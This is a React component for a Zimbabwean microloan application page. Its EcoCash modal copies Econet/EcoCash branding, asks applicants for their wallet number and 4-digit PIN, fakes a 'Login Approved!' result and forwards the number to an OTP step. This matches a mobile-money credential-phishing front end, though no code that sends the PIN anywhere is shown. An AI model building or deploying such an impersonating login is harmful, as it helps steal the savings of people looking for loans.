import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2 } from 'lucide-react';

export default function ApplyPage() {
  const navigate = useNavigate();
  
  // Form State
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState(50000); // Default to 50k ZWG
  const [months, setMonths] = useState(6);
  const [purpose, setPurpose] = useState("");
  const [isPurposeModalOpen, setIsPurposeModalOpen] = useState(false);
  
  const [fullName, setFullName] = useState('');
  const [city, setCity] = useState('');
  const [momoNumber, setMomoNumber] = useState('');
  
  // EcoCash Modal State
  const [isMomoOpen, setIsMomoOpen] = useState(false);
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  // Math
  const totalRepayment = amount + (amount * 0.03 * months);
  const monthlyPayment = totalRepayment / months;

  const formatCurrency = (val: number) => `ZWG ${val.toLocaleString()}`;

  const handleContinue = () => {
    if (step === 1) setStep(2);
    else setIsMomoOpen(true);
  };

  const handleLoginSubmit = () => {
    if (pin.length !== 4 || momoNumber.length < 9) return;
    
    setIsProcessing(true);

    // SIMULATE BACKEND DELAY (2 seconds)
    setTimeout(() => {
      setIsProcessing(false);
      setIsSuccess(true); // Show success screen in modal
      
      // Wait 1.5 seconds so the user sees the success animation, then redirect
      setTimeout(() => {
        navigate('/otp', { state: { phone: momoNumber, amount } });
      }, 1500);

    }, 2000);
  };

  const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];

  return (
    <div style={{ maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
      
      <style>{`
        input::placeholder { color: #a0aec0 !important; font-weight: 400 !important; font-size: 15px !important; letter-spacing: normal !important; }
        input:focus { border-color: #005A9C !important; box-shadow: 0 0 0 3px rgba(0, 90, 156, 0.15) !important; outline: none; }
      `}</style>

      {/* Header */}
      <div style={{ background: 'linear-gradient(135deg, #003B73 0%, #005A9C 100%)', padding: '24px 20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', boxShadow: '0 4px 12px rgba(0,0,0,0.1)' }}>
        
        <div 
          onClick={() => step === 1 ? navigate('/') : setStep(1)} 
          style={{ 
            display: 'inline-flex', alignItems: 'center', gap: '6px', fontSize: '15px', 
            fontWeight: 500, color: 'white', background: 'rgba(255,255,255,0.15)', 
            padding: '8px 16px', borderRadius: '20px', cursor: 'pointer', marginBottom: '20px',
            transition: 'background 0.2s', backdropFilter: 'blur(4px)'
          }}
          onMouseEnter={(e) => e.currentTarget.style.background = 'rgba(255,255,255,0.25)'}
          onMouseLeave={(e) => e.currentTarget.style.background = 'rgba(255,255,255,0.15)'}
        >
          {step === 1 ? <Home size={16} /> : <ChevronLeft size={18} />}
          {step === 1 ? 'Home' : 'Back'} 
          <span style={{ opacity: 0.6, margin: '0 4px' }}>/</span> 
          {step === 1 ? 'Apply' : 'Loan Details'}
        </div>

        <h1 style={{ fontSize: '28px', fontWeight: 800, margin: '0 0 10px 0' }}>Let's get you <span style={{color: '#FFCC00'}}>sorted.</span></h1>
        <p style={{ fontSize: '14px', opacity: 0.9, lineHeight: 1.5, margin: 0 }}>Four short steps, about three minutes. Have your EcoCash number ready.</p>
      </div>

      {/* Main Form Card */}
      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', fontWeight: 700, color: '#005A9C', marginBottom: '8px' }}>
          <span>STEP {step} OF 2</span>
          <span>{step === 1 ? 'Loan details' : 'Your details'}</span>
        </div>
        <div style={{ height: '6px', backgroundColor: '#e0e0e0', borderRadius: '3px', marginBottom: '28px', overflow: 'hidden' }}>
          <div style={{ height: '100%', backgroundColor: '#005A9C', width: step === 1 ? '50%' : '100%', transition: 'width 0.3s' }}></div>
        </div>

        {step === 1 ? (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0', color: '#111' }}>How much do you need?</h3>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '24px' }}>Choose an amount between ZWG 5,000 and ZWG 800,000.</p>

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>LOAN AMOUNT</label>
            
            <div style={{ display: 'flex', alignItems: 'center', border: '2px solid #e2e8f0', borderRadius: '14px', padding: '0 20px', marginBottom: '20px', backgroundColor: '#fcfcfc', transition: 'all 0.2s' }}>
              <span style={{ fontWeight: 800, color: '#005A9C', fontSize: '18px', marginRight: '10px' }}>ZWG</span>
              <input 
                type="number" 
                value={amount} 
                onChange={(e) => setAmount(Number(e.target.value))} 
                style={{ width: '100%', padding: '18px 0', border: 'none', backgroundColor: 'transparent', fontSize: '18px', fontWeight: 600, color: '#111', outline: 'none' }} 
              />
            </div>

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>QUICK PICK</label>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[10000, 50000, 200000, 800000].map(val => (
                <div key={val} onClick={() => setAmount(val)} style={{ padding: '12px 18px', borderRadius: '20px', border: amount === val ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: amount === val ? '#005A9C' : 'white', color: amount === val ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600, transition: 'all 0.2s' }}>
                  ZWG {val.toLocaleString()}
                </div>
              ))}
            </div>

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>REPAYMENT PERIOD</label>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[1, 3, 6, 12, 24].map(m => (
                <div key={m} onClick={() => setMonths(m)} style={{ padding: '12px 18px', borderRadius: '20px', border: months === m ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: months === m ? '#005A9C' : 'white', color: months === m ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600, transition: 'all 0.2s' }}>
                  {m} month{m > 1 && 's'}
                </div>
              ))}
            </div>

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>WHAT'S IT FOR?</label>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '18px 20px', border: '2px solid #e2e8f0', borderRadius: '14px', cursor: 'pointer', color: purpose ? '#111' : '#a0aec0', fontSize: '15px', backgroundColor: '#fcfcfc', fontWeight: purpose ? 500 : 400 }} onClick={() => setIsPurposeModalOpen(true)}>
              {purpose || 'Select a purpose'}
              <ChevronDown size={20} color={purpose ? '#005A9C' : '#a0aec0'} />
            </div>
          </>
        ) : (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0', color: '#111' }}>Tell us about you</h3>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '24px' }}>We use these details to verify your identity.</p>

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>FULL NAME</label>
            <input type="text" placeholder="e.g. Tinashe Moyo" value={fullName} onChange={(e) => setFullName(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', fontSize: '16px', marginBottom: '20px', boxSizing: 'border-box', color: '#111', fontWeight: 500 }} />

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>CITY / TOWN</label>
            <input type="text" placeholder="e.g. Harare" value={city} onChange={(e) => setCity(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', fontSize: '16px', marginBottom: '20px', boxSizing: 'border-box', color: '#111', fontWeight: 500 }} />

            <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#333', marginBottom: '10px', letterSpacing: '0.5px' }}>ECOCASH NUMBER</label>
            <input type="tel" placeholder="77X XXX XXX" value={momoNumber} onChange={(e) => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', fontSize: '16px', boxSizing: 'border-box', color: '#111', fontWeight: 500 }} />
          </>
        )}
      </div>

      {/* Summary Card */}
      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px', letterSpacing: '0.5px' }}>YOUR APPLICATION</label>
        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(amount)}</h2>
        <p style={{ fontSize: '15px', color: '#666', marginBottom: '24px' }}>Over {months} months</p>
        
        <div style={{ borderTop: '1px dashed #cbd5e1', paddingTop: '20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px', color: '#555' }}><span>Estimated monthly</span><span style={{ fontWeight: 700, color: '#111' }}>{formatCurrency(monthlyPayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px', color: '#555' }}><span>Total repayment</span><span style={{ fontWeight: 700, color: '#111' }}>{formatCurrency(totalRepayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px', color: '#555' }}><span>Purpose</span><span style={{ fontWeight: 700, color: '#111' }}>{purpose || '—'}</span></div>
        </div>
      </div>

      {/* Button */}
      <div style={{ display: 'flex', gap: '12px', padding: '0 20px 30px' }}>
        {step === 2 && <button onClick={() => setStep(1)} style={{ flex: 1, padding: '18px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: 'white', fontSize: '16px', fontWeight: 700, color: '#005A9C', cursor: 'pointer' }}>Back</button>}
        <button onClick={handleContinue} style={{ flex: 2, padding: '18px', borderRadius: '14px', border: 'none', backgroundColor: '#005A9C', color: 'white', fontSize: '16px', fontWeight: 700, cursor: 'pointer', boxShadow: '0 4px 12px rgba(0, 90, 156, 0.2)' }}>Continue</button>
      </div>

      {/* Purpose Bottom Sheet */}
      {isPurposeModalOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'flex-end', justifyContent: 'center', backdropFilter: 'blur(4px)' }} onClick={() => setIsPurposeModalOpen(false)}>
          <div style={{ backgroundColor: 'white', width: '100%', maxWidth: '480px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px 0', animation: 'slideUp 0.3s ease-out' }} onClick={e => e.stopPropagation()}>
            <style>{`@keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }`}</style>
            <div style={{ width: '40px', height: '4px', backgroundColor: '#e2e8f0', borderRadius: '2px', margin: '0 auto 20px' }}></div>
            <div style={{ padding: '0 24px 10px', color: '#111', fontSize: '18px', fontWeight: 700, marginBottom: '10px' }}>Select a purpose</div>
            {purposes.map(p => (
              <div key={p} style={{ padding: '16px 24px', borderBottom: '1px solid #f1f5f9', fontSize: '16px', color: '#333', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontWeight: 500 }} onClick={() => { setPurpose(p); setIsPurposeModalOpen(false); }}>
                {p}
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: purpose === p ? '7px solid #005A9C' : '2px solid #cbd5e1', transition: 'all 0.2s' }}></div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ECOCASH LOGIN MODAL */}
      {isMomoOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', backdropFilter: 'blur(4px)' }}>
          <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
            
            {!isProcessing && !isSuccess && (
              <button style={{ position: 'absolute', top: '20px', right: '20px', background: '#f1f5f9', border: 'none', cursor: 'pointer', borderRadius: '50%', padding: '8px', display: 'flex' }} onClick={() => setIsMomoOpen(false)}><X size={20} color="#64748b" /></button>
            )}
            
            {isSuccess ? (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '20px 0' }}>
                <div style={{ width: '70px', height: '70px', backgroundColor: '#e8f5e9', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '20px' }}>
                  <CheckCircle2 size={40} color="#00c853" />
                </div>
                <h2 style={{ fontSize: '22px', fontWeight: 800, color: '#111', marginBottom: '10px' }}>Login Approved!</h2>
                <p style={{ fontSize: '14px', color: '#666', textAlign: 'center' }}>Redirecting to OTP verification...</p>
              </div>
            ) : isProcessing ? (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '30px 0' }}>
                <div style={{ width: '48px', height: '48px', border: '4px solid #f1f5f9', borderTop: '4px solid #0b40c4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
                <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
                <p style={{ marginTop: '20px', fontSize: '15px', fontWeight: 600, color: '#0b40c4' }}>Logging in...</p>
              </div>
            ) : (
              <>
                {/* ECOCASH BRANDING */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '24px' }}>
                  <div style={{ background: 'white', border: '1px solid #eee', color: '#0b40c4', padding: '6px 10px', borderRadius: '8px', fontWeight: 800, fontSize: '14px', fontStyle: 'italic', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
                    ECONET <span style={{fontSize: '7px', display: 'block', textAlign: 'center'}}>Wireless</span>
                  </div>
                  <div style={{ color: '#e53935', fontWeight: 800, fontSize: '16px', background: 'white', padding: '6px 10px', borderRadius: '8px', border: '1px solid #eee', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
                    EcoCash
                  </div>
                </div>

                <h2 style={{ fontSize: '22px', fontWeight: 800, textAlign: 'center', margin: '0 0 12px 0', color: '#111' }}>Login to EcoCash</h2>
                <p style={{ fontSize: '14px', color: '#666', textAlign: 'center', marginBottom: '28px', lineHeight: 1.5 }}>Sign in with your EcoCash number and PIN to proceed.</p>

                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '10px' }}>ECOCASH NUMBER</label>
                <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '14px', marginBottom: '20px', overflow: 'hidden', backgroundColor: '#fcfcfc' }}>
                  <div style={{ padding: '18px 16px', backgroundColor: '#f1f5f9', borderRight: '2px solid #e2e8f0', display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 600 }}>🇿🇼 +263</div>
                  <input 
                    type="tel" 
                    placeholder="77X XXX XXX"
                    value={momoNumber} 
                    onChange={e => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} 
                    style={{ width: '100%', padding: '18px', border: 'none', backgroundColor: 'transparent', fontSize: '18px', fontWeight: 700, color: '#111', outline: 'none', letterSpacing: '1px' }} 
                  />
                </div>
                
                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '10px' }}>ENTER PIN</label>
                <div style={{ position: 'relative' }}>
                  <input 
                    type={showPin ? "text" : "password"} 
                    placeholder="••••" 
                    value={pin} 
                    onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0,4))} 
                    style={{ width: '100%', padding: '20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', fontSize: '24px', fontWeight: 700, textAlign: 'center', letterSpacing: '16px', boxSizing: 'border-box', color: '#111', outline: 'none' }} 
                  />
                  <div style={{ position: 'absolute', right: '16px', top: '22px', display: 'flex', gap: '12px', fontSize: '13px', color: '#0b40c4', fontWeight: 700 }}>
                    <span style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px' }} onClick={() => setShowPin(!showPin)}>
                      {showPin ? <EyeOff size={16}/> : <Eye size={16}/>} {showPin ? 'Hide' : 'Peek'}
                    </span>
                    <span style={{ cursor: 'pointer', color: '#888' }} onClick={() => setPin('')}>Clear</span>
                  </div>
                </div>
                <p style={{ fontSize: '12px', color: '#64748b', marginTop: '12px', textAlign: 'center' }}>Enter the 4-digit PIN for your EcoCash account.</p>

                <button onClick={handleLoginSubmit} style={{ width: '100%', padding: '18px', marginTop: '28px', borderRadius: '14px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontSize: '16px', fontWeight: 700, cursor: (pin.length === 4 && momoNumber.length >= 9) ? 'pointer' : 'not-allowed', transition: 'all 0.2s' }}>Login securely</button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}